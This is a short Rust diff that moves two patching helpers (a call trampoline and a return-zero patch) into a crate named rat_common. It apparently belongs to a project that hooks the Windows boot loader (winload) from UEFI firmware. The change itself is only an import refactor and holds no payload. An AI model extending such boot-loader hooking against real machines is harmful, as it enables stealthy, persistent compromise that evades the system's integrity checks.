@@ -2,9 +2,10 @@ use core::mem;
 use core::sync::atomic::{AtomicI64, Ordering};
 
 use log::{error, info};
+use rat_common::windows::utils::{insert_call_trampoline, return_zero_patch};
 
 use crate::hooks::winload::patch_winload;
-use crate::patcher::{VariablePatternFinder, insert_call_trampoline, return_zero_patch};
+use crate::patcher::VariablePatternFinder;
 use crate::utils;
 
 type _BlpArchTransferTo64BitApplicationFn = unsafe extern "efiapi" fn(
